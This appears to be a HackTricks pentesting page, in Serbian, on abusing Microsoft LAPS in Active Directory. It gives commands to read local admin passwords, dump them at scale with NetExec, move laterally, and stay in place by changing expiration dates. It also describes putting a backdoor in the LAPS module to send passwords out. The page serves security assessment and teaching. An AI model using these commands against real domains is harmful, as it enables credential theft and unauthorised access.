# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Osnovne informacije

Trenutno postoje **2 LAPS varijante** koje možete da sretnete tokom procene:

- **Legacy Microsoft LAPS**: čuva lozinku lokalnog administratora u **`ms-Mcs-AdmPwd`** i vreme isteka u **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (ugrađen u Windows od April 2023 ažuriranja): i dalje može da emulira legacy režim, ali u nativnom režimu koristi **`msLAPS-*`** atribute, podržava **password encryption**, **password history**, i **DSRM password backup** za domain controllere.

LAPS je dizajniran da upravlja **lozinkama lokalnog administratora**, čineći ih **jedinstvenim, nasumičnim i često menjanim** na računarima priključenim na domain. Ako možete da čitate te atribute, obično možete da **pivotujete kao lokalni admin** na pogođeni host. U mnogim okruženjima, zanimljiv deo nije samo čitanje same lozinke, već i pronalaženje **ko je imao delegiran pristup** atributima lozinke.

### Legacy Microsoft LAPS atributi

U computer objektima domaina, implementacija legacy Microsoft LAPS rezultira dodavanjem dva atributa:

- **`ms-Mcs-AdmPwd`**: **plain-text lozinka administratora**
- **`ms-Mcs-AdmPwdExpirationTime`**: **vreme isteka lozinke**

### Windows LAPS atributi

Native Windows LAPS dodaje nekoliko novih atributa u computer objekte:

- **`msLAPS-Password`**: clear-text password blob čuvan kao JSON kada encryption nije omogućen
- **`msLAPS-PasswordExpirationTime`**: zakazano vreme isteka
- **`msLAPS-EncryptedPassword`**: šifrovana trenutna lozinka
- **`msLAPS-EncryptedPasswordHistory`**: šifrovana istorija lozinki
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: šifrovani DSRM podaci za lozinku za domain controllere
- **`msLAPS-CurrentPasswordVersion`**: verzijsko praćenje zasnovano na GUID-u koje koristi novija logika za detekciju rollback-a (Windows Server 2025 forest schema)

Kada je **`msLAPS-Password`** čitljiv, vrednost je JSON objekat koji sadrži ime naloga, vreme ažuriranja i clear-text lozinku, na primer:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Proveri da li je aktiviran
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## LAPS Password Access

Možete **preuzeti raw LAPS policy** iz `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` i zatim koristiti **`Parse-PolFile`** iz paketa [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) da biste konvertovali ovu datoteku u format čitljiv za čoveka.

### Legacy Microsoft LAPS PowerShell cmdlets

Ako je legacy LAPS modul instaliran, sledeći cmdlets su obično dostupni:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

Native Windows LAPS dolazi sa novim PowerShell modulom i novim cmdlet-ima:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
Nekoliko operativnih detalja je ovde važno:

- **`Get-LapsADPassword`** automatski obrađuje **legacy LAPS**, **clear-text Windows LAPS** i **encrypted Windows LAPS**.
- Ako je password encrypted i možete da ga **čitate** ali ne i **decrypt**ujete, cmdlet vraća metapodatke kao što su **`Source`**, **`DecryptionStatus`** i **`AuthorizedDecryptor`** čak i kada ne može da vrati clear-text password.
- U **encrypted Windows LAPS**, **read permission** i **decrypt permission** su **različite kontrole**. To što imate OU / object read access ne znači automatski da možete decryptovati **`msLAPS-EncryptedPassword`**.
- **Password history** je dostupna samo kada je omogućena **Windows LAPS encryption**.
- Na domain controllers, vraćeni source može biti **`EncryptedDSRMPassword`**.

Ovo je korisno tokom assessment-a zato što polje **`AuthorizedDecryptor`** pokazuje **za kojeg user-a ili group** je blob bio encrypted, često pretvarajući neuspešno čitanje password-a u novu privilege-escalation metu.

### PowerView / LDAP

**PowerView** se takođe može koristiti da se otkrije **ko može da čita password i da ga pročita**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Ako je **`msLAPS-Password`** čitljiv, parsiraj vraćeni JSON i izvuci **`p`** za lozinku i **`n`** za ime upravljanog lokalnog admin naloga.
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
To **`n`** polje je važno na novijim deployment-ima zato što **Windows LAPS automatic account management** može da cilja **custom account** umesto ugrađenog **`Administrator`**, a noviji sistemi **Windows 11 24H2 / Windows Server 2025** mogu čak i da **randomize** taj naziv account-a.

### Linux / remote tooling

Modern tooling podržava i legacy Microsoft LAPS i Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Napomene:

- Nedavne **NetExec** verzije podržavaju **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`**, i **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** je i dalje koristan za **legacy Microsoft LAPS** sa Linux-a, ali cilja samo **`ms-Mcs-AdmPwd`**.
- Noviji cross-platform alati kao što su **`LAPS4LINUX`**, alati zasnovani na **`dpapi-ng`**, i nedavni **NetExec** workflow-i takođe mogu da obrađuju **native Windows LAPS** sa ne-Windows hostova.
- Ako okruženje koristi **encrypted Windows LAPS**, prost LDAP read nije dovoljan; takođe moraš biti **authorized decryptor** (ili imati ekvivalentan decryption materijal, kao što je offline domain DPAPI-NG root key material).
- Na **Windows 11 24H2 / Windows Server 2025**, nemoj pretpostaviti da je managed local admin uvek **`Administrator`**. Automatic account management može da kreira custom account i opciono randomizuje njegovo ime, pa prvo otkrij ime naloga preko **`n`** / **`Account`** pre nego što koristiš **`--laps`** na velikoj skali.

### Abusing directory synchronization

Ako imaš domain-level **directory synchronization** prava umesto direktnog read access-a nad svakim computer object-om, LAPS i dalje može biti zanimljiv.

Kombinacija **`DS-Replication-Get-Changes`** sa **`DS-Replication-Get-Changes-In-Filtered-Set`** ili **`DS-Replication-Get-Changes-All`** može da se koristi za sinkronizaciju **confidential / RODC-filtered** atributa kao što je legacy **`ms-Mcs-AdmPwd`**. BloodHound ovo modeluje kao **`SyncLAPSPassword`**. Pogledaj [DCSync](dcsync.md) za background o replication-rights.

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) olakšava enumeration LAPS-a kroz više funkcija.\
Jedna je parsiranje **`ExtendedRights`** za **sve računare sa omogućenim LAPS-om.** Ovo prikazuje **grupe** koje su posebno **delegirane da čitaju LAPS lozinke**, a koje su često korisnici u protected grupama.\
**Account** koji je **pridružen računar** domain-u dobija `All Extended Rights` nad tim hostom, i to pravo daje **account-u** mogućnost da **čita lozinke**. Enumeration može da pokaže korisnički nalog koji može da pročita LAPS lozinku na hostu. Ovo može da nam pomogne da **targetujemo specifične AD korisnike** koji mogu da čitaju LAPS lozinke.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Dumping LAPS Passwords With NetExec / CrackMapExec

Ako nemate interaktivni PowerShell, možete zloupotrebiti ovu privilegiju remoto preko LDAP:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Ovo dumpuje sve LAPS tajne koje korisnik može da pročita, omogućavajući vam da se krećete lateralno sa drugačijom lokalnom administratorskom lozinkom.

## Using LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS Persistencija

### Datum isteka

Jednom kada ste admin, moguće je **dobiti lozinke** i **sprečiti** mašinu da **ažurira** svoju **lozinku** tako što ćete **postaviti datum isteka u budućnost**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS koristi **`msLAPS-PasswordExpirationTime`** umesto toga:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> Lozinka će se i dalje rotirati ako **admin** koristi **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, ili ako je omogućeno **Do not allow password expiration time longer than required by policy**.

### Snapshot rollback caveat on newer Windows LAPS

Stariji trikovi sa rollback-om snapshot-a / image rollback-om su **manje pouzdani** protiv novijih **Windows LAPS** deployment-a. Na **Windows 11 24H2 / Windows Server 2025**, ako forest schema sadrži **`msLAPS-CurrentPasswordVersion`** (**Windows Server 2025 forest schema**), client poredi lokalno keširani GUID sa vrednošću sačuvanom u AD i **odmah rotira lozinku** kada rollback napravi **torn state**.

U praksi, ovo znači da snapshot-based persistence ili pokušaji da se oživi starija poznata lokalna admin lozinka mogu brzo propasti umesto da prežive do sledećeg normalnog isteka.

Ova zaštita se primenjuje samo na **AD-backed Windows LAPS** i i dalje zavisi od toga da vraćena mašina može da se **authenticuje nazad na AD**. Ako mašina više ne može da komunicira sa AD, **password history** ili **AD backup access** i dalje mogu da spasu stvar.

### Automatic account management tamper caveat

Kada je **automatic account management** omogućen, Windows LAPS upravlja životnim ciklusom lokalnog admin naloga koji se administrira. Neočekivani pokušaji da se taj nalog preimenuje, ponovo konfiguriše ili na drugi način menja mogu biti odbijeni sa **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**, pa je persistence koja zavisi od tihog menjanja upravljanog LAPS naloga manje pouzdana na novijim endpoint-ovima.

### Recovering historical passwords from AD backups

Kada je omogućeno **Windows LAPS encryption + password history**, montirani AD backup-ovi mogu postati dodatni izvor tajni. Ako možeš da pristupiš montiranom AD snapshot-u i koristiš **recovery mode**, možeš da upitaš starije sačuvane lozinke bez komunikacije sa živim DC.
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Ovo je uglavnom relevantno tokom **AD backup theft**, **offline forensics abuse**, ili **disaster-recovery media access**.

### Backdoor

Originalni source code za legacy Microsoft LAPS može se naći [ovde](https://github.com/GreyCorbel/admpwd), zato je moguće ubaciti backdoor u code (na primer, unutar `Get-AdmPwdPassword` metode u `Main/AdmPwd.PS/Main.cs`) koji će na neki način **exfiltrate new passwords or store them somewhere**.

Zatim, kompajliraj novi `AdmPwd.PS.dll` i uploaduj ga na mašinu u `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (i promeni modification time).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
